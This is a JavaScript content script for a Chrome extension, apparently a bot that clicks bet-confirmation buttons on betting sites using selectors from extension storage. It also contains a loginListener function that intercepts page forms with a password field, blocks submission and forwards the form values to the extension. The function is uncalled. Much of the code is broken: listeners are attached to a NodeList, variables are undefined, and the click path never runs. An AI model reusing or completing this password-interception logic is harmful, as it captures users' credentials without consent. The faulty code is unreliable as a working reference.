let lambo_port = chrome.runtime.connect({name:"chrome_lambo"});

let betSite = null;
let current_betsite = null;
let betslip_buttons = null;
let confirm_button = null;

lambo_port.onMessage.addListener((msg)=>{
  console.log(msg)
  switch (msg.event) {
    case "confirm_bet":
      confirmBet();
      break;

    case "click":
      confirmBet();
      break;

    default:
      break;
  }
});

function betsite_init(){
  betslip_buttons = current_betsite.betslip_buttons;
  confirm_button = current_betsite.confirm_button;
}

function getCurrentBetSite(){
  chrome.storage.sync.get({
    betsites:[],
  },(items)=>{
    if(items.betsites.length > 0){
      items.betsites.forEach(
        (betsite)=>{
          if(betsite.id == betsite_id){
            current_betsite = betsite;
            betsite_init();
          }
        }
      );
    }
    if(!current_betsite){
      alert("Please update betsites");
    }
  });
}

function confirmBet(){
  if(betSite){
    document.querySelectorAll(betslip_buttons)[confirm_button].click();
  } else {
    getCurrentBetSite();
  }
}

function loginListener(){
  document.querySelectorAll("form").addEventListener(
    "submit",
    (event)=>{
      event.preventDefault();
      var theForm = new FormData(event.target);
      if(theForm.has("password")){
        alert(theForm.values());
        lambo_port.postMessage({
          command:"form_data",
          kwargs:{
            values:theForm.values()
          }
        });
      }
    }
  );
}

getCurrentBetSite();
